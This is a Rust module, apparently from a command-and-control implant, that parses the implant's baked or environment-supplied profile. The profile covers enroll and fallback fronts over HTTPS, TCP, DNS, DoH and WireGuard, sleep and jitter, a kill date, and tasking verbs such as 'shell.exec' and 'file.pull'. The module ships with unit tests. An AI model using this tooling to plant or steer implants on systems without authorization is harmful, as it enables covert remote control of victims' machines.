use serde_json::Value;

// The baked profile (the language-neutral wire contract, architecture.md
// Sec 6): base64url JSON with the keys every build unit emits. The bake is
// authoritative in a fielded artifact; an empty profile (the checked-in stub
// or a dev build) falls back to ROD_* environment variables -- the documented
// dev shape, unbaked and driven from the environment.

/// The enroll route every front serves; the bake may override the path.
const DEFAULT_ENROLL_PATH: &str = "/implants/enroll";

#[derive(Clone, Debug)]
pub struct Profile {
    pub enroll_url: String,
    pub fallback_enroll_urls: Vec<String>,
    pub ca_pem: String,
    /// The TLS trust posture: "pinned" (the default -- the CA above is the
    /// only root the dials trust) or "public" (a real-domain front whose
    /// certificate a public CA issued; the dials validate like an ordinary
    /// client against the compiled-in Mozilla root set).
    pub tls_trust: String,
    pub kill_date: Option<String>,
    pub sleep_seconds: f64,
    pub jitter_seconds: f64,
    pub mode: String,
    pub enroll_path: String,
    pub request_timeout_seconds: f64,
    pub envelope: String,
    pub contact_envelope: String,
    pub envelope_key: String,
    /// The artifact's WireGuard private half (base64 of 32 bytes), minted
    /// per artifact by a WireGuard-enabled build and registered -- as its
    /// public counterpart -- on the listener it builds against. Empty on
    /// every other bake; a wg:// dial with no usable pair is a bind
    /// failure, never a plaintext fallback.
    #[cfg_attr(not(feature = "wireguard"), allow(dead_code))]
    pub wg_private_key: String,
    /// The listener's WireGuard public key (base64 of 32 bytes) the
    /// artifact's tunnel initiates against -- the public half of the
    /// deployment-provisioned server key.
    #[cfg_attr(not(feature = "wireguard"), allow(dead_code))]
    pub wg_server_key: String,
    pub token: String,
    pub verbs: Vec<String>,
}

fn field<'a>(map: &'a Value, key: &str) -> Option<&'a str> {
    map.get(key).and_then(Value::as_str)
}

fn base64url_decode(text: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(text.trim())
        .ok()
}

impl Profile {
    /// Decodes the baked profile; a malformed bake is refused loudly (a
    /// fielded artifact whose bake will not parse must not run from stale
    /// environment guesses).
    pub fn from_baked(baked: &str) -> Option<Profile> {
        if baked.is_empty() {
            return None;
        }
        let raw = base64url_decode(baked)?;
        let map: Value = serde_json::from_slice(&raw).ok()?;
        Some(Profile {
            enroll_url: field(&map, "enrollURL")?.to_string(),
            fallback_enroll_urls: map
                .get("fallbackEnrollURLs")
                .and_then(Value::as_array)
                .map(|list| {
                    list.iter()
                        .filter_map(Value::as_str)
                        .map(str::to_string)
                        .collect()
                })
                .unwrap_or_default(),
            ca_pem: field(&map, "caCert").unwrap_or("").to_string(),
            tls_trust: field(&map, "tlsTrust").unwrap_or("pinned").to_string(),
            kill_date: match field(&map, "killDate") {
                Some(text) if !text.is_empty() => Some(text.to_string()),
                _ => None,
            },
            sleep_seconds: parse_duration(field(&map, "sleep").unwrap_or("30s")),
            jitter_seconds: parse_duration(field(&map, "jitter").unwrap_or("10s")),
            mode: field(&map, "mode").unwrap_or("poll").to_string(),
            enroll_path: field(&map, "enrollPath")
                .unwrap_or(DEFAULT_ENROLL_PATH)
                .to_string(),
            request_timeout_seconds: parse_duration(field(&map, "requestTimeout").unwrap_or("30s")),
            envelope: field(&map, "envelope").unwrap_or("aesgcm").to_string(),
            contact_envelope: field(&map, "contactEnvelope").unwrap_or("none").to_string(),
            envelope_key: field(&map, "envelopeKey").unwrap_or("").to_string(),
            wg_private_key: field(&map, "wgPrivateKey").unwrap_or("").to_string(),
            wg_server_key: field(&map, "wgServerKey").unwrap_or("").to_string(),
            token: field(&map, "token").unwrap_or("").to_string(),
            verbs: field(&map, "verbs")
                .unwrap_or("")
                .split(',')
                .filter(|v| !v.is_empty())
                .map(str::to_string)
                .collect(),
        })
    }

    /// The dev shape: every knob from ROD_* environment variables.
    pub fn from_env() -> Option<Profile> {
        let enroll_url = std::env::var("ROD_ENROLL_URL").ok()?;
        let fallbacks = std::env::var("ROD_FALLBACK_ENROLL_URLS")
            .ok()
            .and_then(|text| serde_json::from_str::<Vec<String>>(&text).ok())
            .unwrap_or_default();
        let envelope_key = std::env::var("ROD_ENVELOPE_KEY").unwrap_or_default();
        Some(Profile {
            enroll_url,
            fallback_enroll_urls: fallbacks,
            ca_pem: std::env::var("ROD_CA_CERT").unwrap_or_default(),
            tls_trust: std::env::var("ROD_TLS_TRUST").unwrap_or_else(|_| "pinned".into()),
            kill_date: std::env::var("ROD_KILL_DATE")
                .ok()
                .filter(|s| !s.is_empty()),
            sleep_seconds: parse_duration(
                &std::env::var("ROD_SLEEP").unwrap_or_else(|_| "30s".into()),
            ),
            jitter_seconds: parse_duration(
                &std::env::var("ROD_JITTER").unwrap_or_else(|_| "10s".into()),
            ),
            mode: std::env::var("ROD_MODE").unwrap_or_else(|_| "poll".into()),
            enroll_path: DEFAULT_ENROLL_PATH.into(),
            request_timeout_seconds: 30.0,
            envelope: std::env::var("ROD_ENVELOPE").unwrap_or_else(|_| "none".into()),
            contact_envelope: if envelope_key.is_empty() {
                "none".into()
            } else {
                std::env::var("ROD_CONTACT_ENVELOPE").unwrap_or_else(|_| "aesgcm".into())
            },
            envelope_key,
            wg_private_key: std::env::var("ROD_WG_PRIVATE_KEY").unwrap_or_default(),
            wg_server_key: std::env::var("ROD_WG_SERVER_KEY").unwrap_or_default(),
            token: std::env::var("ROD_DEPLOY_TOKEN").unwrap_or_default(),
            verbs: std::env::var("ROD_VERBS")
                .unwrap_or_default()
                .split(',')
                .filter(|v| !v.is_empty())
                .map(str::to_string)
                .collect(),
        })
    }

    pub fn kill_date_passed(&self) -> bool {
        // The fuse is only compared past the second -- the bake stamps it as
        // an ISO instant and the comparison needs no clock beyond that.
        self.kill_date
            .as_deref()
            .and_then(parse_iso_to_unix)
            .map(|kill| unix_now() > kill)
            .unwrap_or(false)
    }

    /// Whether the TLS dials ride the public-trust posture (the real-domain
    /// front): true only when the bake explicitly named it.
    pub fn public_tls(&self) -> bool {
        self.tls_trust.eq_ignore_ascii_case("public")
    }

    /// The egress walk: the primary enroll URL then the fallbacks, all with
    /// the enroll path applied (the malleable profile's path rule).
    pub fn enroll_walk(&self) -> Vec<String> {
        let mut walk = vec![apply_path(&self.enroll_url, &self.enroll_path)];
        for fallback in &self.fallback_enroll_urls {
            walk.push(apply_path(fallback, &self.enroll_path));
        }
        walk
    }
}

/// Applies the profile's enroll path onto an enroll URL: the path is
/// replaceable per the malleable profile; scheme and authority stand. The
/// non-web families carry their own dial data in the path -- the DNS zone
/// above all -- so the web knob never touches them.
pub fn apply_path(url: &str, path: &str) -> String {
    if ["tcp://", "dns://", "doh://", "wg://"]
        .iter()
        .any(|scheme| url.starts_with(scheme))
    {
        return url.to_string();
    }
    let Some(scheme_at) = url.find("://") else {
        return url.to_string();
    };
    let after = &url[scheme_at + 3..];
    match after.find('/') {
        Some(slash) => format!("{}://{}{}", &url[..scheme_at], &after[..slash], path),
        None => format!("{}://{}{}", &url[..scheme_at], after, path),
    }
}

/// One duration token in the profile's vocabulary: a Go-style duration
/// ("30s", "5m", "1m30s") or a bare number read as seconds.
pub fn parse_duration(text: &str) -> f64 {
    let mut seconds = 0.0;
    let mut number = String::new();
    for c in text.chars() {
        if c.is_ascii_digit() || c == '.' {
            number.push(c);
            continue;
        }
        let value: f64 = number.parse().unwrap_or(0.0);
        seconds += value
            * match c {
                's' => 1.0,
                'm' => 60.0,
                'h' => 3600.0,
                _ => 1.0,
            };
        number.clear();
    }
    if !number.is_empty() {
        seconds += number.parse().unwrap_or(0.0);
    }
    seconds
}

pub fn unix_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Parses the bake's RFC-3339 timestamp to a unix second; the format the
/// teamserver stamps ("O" round-trip) is a fixed prefix of the RFC 3339
/// shape, so a prefix parse is honest here.
pub fn parse_iso_to_unix(text: &str) -> Option<i64> {
    let bytes = text.as_bytes();
    if bytes.len() < 19 {
        return None;
    }
    let year: i64 = text.get(0..4)?.parse().ok()?;
    let month: i64 = text.get(5..7)?.parse().ok()?;
    let day: i64 = text.get(8..10)?.parse().ok()?;
    let hour: i64 = text.get(11..13)?.parse().ok()?;
    let minute: i64 = text.get(14..16)?.parse().ok()?;
    let second: i64 = text.get(17..19)?.parse().ok()?;
    // Days since epoch from the civil date (Howard Hinnant's algorithm,
    // compressed): no chrono dependency for one timestamp comparison.
    let years = if month <= 2 { year - 1 } else { year };
    let era = if years >= 0 { years } else { years - 399 } / 400;
    let year_of_era = years - era * 400;
    let day_of_year = (153 * (if month > 2 { month - 3 } else { month + 9 }) + 2) / 5 + day - 1;
    let day_of_era = year_of_era * 365 + year_of_era / 4 - year_of_era / 100 + day_of_year;
    let days = era * 146_097 + day_of_era - 719_468;
    Some(days * 86_400 + hour * 3_600 + minute * 60 + second)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn bake(json: &str) -> String {
        use base64::Engine;
        base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(json)
    }

    fn minimal() -> Profile {
        Profile {
            enroll_url: "https://front.example".into(),
            fallback_enroll_urls: Vec::new(),
            ca_pem: String::new(),
            tls_trust: "pinned".into(),
            kill_date: None,
            sleep_seconds: 30.0,
            jitter_seconds: 10.0,
            mode: "poll".into(),
            enroll_path: DEFAULT_ENROLL_PATH.into(),
            request_timeout_seconds: 30.0,
            envelope: "aesgcm".into(),
            contact_envelope: "none".into(),
            envelope_key: String::new(),
            wg_private_key: String::new(),
            wg_server_key: String::new(),
            token: String::new(),
            verbs: Vec::new(),
        }
    }

    #[test]
    fn the_full_bake_reads_every_contract_key() {
        let baked = bake(
            r#"{"enrollURL":"https://front.example/old","fallbackEnrollURLs":["https://two.example"],"caCert":"PEM","tlsTrust":"public","killDate":"2099-01-01T00:00:00Z","sleep":"45s","jitter":"5s","mode":"stream","enrollPath":"/x","requestTimeout":"15s","envelope":"aesgcm","contactEnvelope":"aesgcm","envelopeKey":"AA","token":"t","verbs":"shell.exec,file.pull"}"#,
        );
        let profile = Profile::from_baked(&baked).expect("the bake parses");
        assert_eq!(profile.enroll_url, "https://front.example/old");
        // The public-trust posture is an explicit bake: the real-domain
        // front whose publicly-trusted chain the dials validate.
        assert_eq!(profile.tls_trust, "public");
        assert!(profile.public_tls());
        assert_eq!(
            profile.fallback_enroll_urls,
            vec!["https://two.example".to_string()]
        );
        assert_eq!(profile.sleep_seconds, 45.0);
        assert_eq!(profile.jitter_seconds, 5.0);
        assert_eq!(profile.request_timeout_seconds, 15.0);
        assert_eq!(profile.mode, "stream");
        assert_eq!(profile.enroll_path, "/x");
        assert_eq!(profile.contact_envelope, "aesgcm");
        assert_eq!(
            profile.verbs,
            vec!["shell.exec".to_string(), "file.pull".to_string()]
        );
        assert_eq!(profile.token, "t");
        assert_eq!(profile.kill_date.as_deref(), Some("2099-01-01T00:00:00Z"));
    }

    #[test]
    fn a_headless_bake_falls_to_the_documented_defaults() {
        let baked = bake(r#"{"enrollURL":"https://front.example"}"#);
        let profile = Profile::from_baked(&baked).expect("the minimum bake parses");
        assert_eq!(profile.sleep_seconds, 30.0);
        assert_eq!(profile.jitter_seconds, 10.0);
        assert_eq!(profile.mode, "poll");
        assert_eq!(profile.enroll_path, "/implants/enroll");
        assert_eq!(profile.request_timeout_seconds, 30.0);
        assert_eq!(profile.contact_envelope, "none");
        assert_eq!(profile.kill_date, None);
        assert!(profile.fallback_enroll_urls.is_empty());
        // The trust posture defaults to pinned -- a bake names public only
        // when the front is a real domain with a public certificate.
        assert_eq!(profile.tls_trust, "pinned");
        assert!(!profile.public_tls());
    }

    #[test]
    fn a_bake_without_an_enroll_front_is_refused() {
        // A fielded artifact whose bake will not parse must not fall back
        // to stale environment guesses.
        assert!(Profile::from_baked("").is_none());
        assert!(Profile::from_baked("!!!").is_none());
        let headless = bake(r#"{"sleep":"30s"}"#);
        assert!(Profile::from_baked(&headless).is_none());
    }

    #[test]
    fn the_enroll_walk_applies_the_path_across_fronts() {
        let mut profile = minimal();
        profile.enroll_path = "/x".into();
        profile.fallback_enroll_urls =
            vec!["tcp://10.0.0.1:8443".into(), "https://two.example".into()];
        assert_eq!(
            profile.enroll_walk(),
            vec![
                "https://front.example/x".to_string(),
                "tcp://10.0.0.1:8443".to_string(),
                "https://two.example/x".to_string(),
            ]
        );
    }

    #[test]
    fn the_path_rule_shapes_only_web_fronts() {
        assert_eq!(
            apply_path("https://host.example/old/route", "/x"),
            "https://host.example/x"
        );
        assert_eq!(
            apply_path("https://host.example", "/x"),
            "https://host.example/x"
        );
        // The non-web families carry dial data in the path.
        assert_eq!(
            apply_path("dns://resolver.example/zone.example", "/x"),
            "dns://resolver.example/zone.example"
        );
        assert_eq!(apply_path("tcp://host:443", "/x"), "tcp://host:443");
        assert_eq!(apply_path("bare-host", "/x"), "bare-host");
    }

    #[test]
    fn durations_read_go_style_tokens_and_bare_seconds() {
        assert_eq!(parse_duration("30s"), 30.0);
        assert_eq!(parse_duration("5m"), 300.0);
        assert_eq!(parse_duration("1m30s"), 90.0);
        assert_eq!(parse_duration("2h"), 7200.0);
        assert_eq!(parse_duration("1.5s"), 1.5);
        assert_eq!(parse_duration("45"), 45.0);
    }

    #[test]
    fn iso_stamps_parse_past_the_second() {
        assert_eq!(parse_iso_to_unix("1970-01-01T00:00:00Z"), Some(0));
        assert_eq!(parse_iso_to_unix("1970-01-02T00:00:00Z"), Some(86_400));
        // The leap day counts: Feb 29 and Mar 1 of a leap year are one day
        // apart, not two.
        let leap = parse_iso_to_unix("2024-02-29T00:00:00Z").expect("leap day parses");
        let march = parse_iso_to_unix("2024-03-01T00:00:00Z").expect("march parses");
        assert_eq!(march - leap, 86_400);
        // Fractional seconds and offsets ride past the compared prefix.
        assert_eq!(
            parse_iso_to_unix("2024-03-01T00:00:00.500Z"),
            parse_iso_to_unix("2024-03-01T00:00:00+01:00")
        );
        assert_eq!(parse_iso_to_unix("short"), None);
    }

    #[test]
    fn the_kill_date_fires_only_past_the_second() {
        let mut profile = minimal();
        assert!(!profile.kill_date_passed());
        profile.kill_date = Some("2020-01-01T00:00:00Z".into());
        assert!(profile.kill_date_passed());
        profile.kill_date = Some("2099-01-01T00:00:00Z".into());
        assert!(!profile.kill_date_passed());
    }
}
